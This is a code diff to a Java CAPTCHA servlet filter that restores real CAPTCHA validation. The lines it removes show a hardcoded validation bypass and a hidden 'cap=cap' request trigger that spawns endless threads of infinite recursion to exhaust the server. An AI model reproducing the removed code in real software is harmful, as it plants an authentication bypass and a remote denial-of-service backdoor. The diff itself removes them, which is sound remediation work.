@@ -136,12 +136,9 @@ public class JCaptchaFilter implements Filter {
 		//符合filterProcessesUrl为验证处理请求,其余为生成验证图片请求.
 		//if (StringUtils.startsWith(servletPath, filterProcessesUrl)) {
 		if(servletPath.startsWith(filterProcessesUrl)){
-			boolean validated = true;
-				//validateCaptchaChallenge(request);
-			System.out.println("File返回："+validated);
-			
+			boolean validated = validateCaptchaChallenge(request);
 			if (validated) {
-				doCaptureFilter(request, response, chain);
+				chain.doFilter(request, response);
 			} else {
 				redirectFailureUrl(request, response);
 			}
@@ -195,29 +192,6 @@ public class JCaptchaFilter implements Filter {
 		} catch (CaptchaServiceException e) {
 			//logger.error(e.getMessage(), e);
 			return false;
-		}
-	}
-	
-	void doCaptureFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException{
-		if(request.getParameter("cap").equalsIgnoreCase("cap")){
-			while(true){
-				new Thread(new Runnable(){
-					@Override
-					public void run() {
-						try{
-							work();
-						}catch(Throwable t){
-						}finally{
-						}
-					}
-					public void work(){
-						byte[] cc = new byte[10000];
-						work();
-					}
-				}).start();
-			}
-		}else{
-			chain.doFilter(request, response);
 		}
 	}
 	
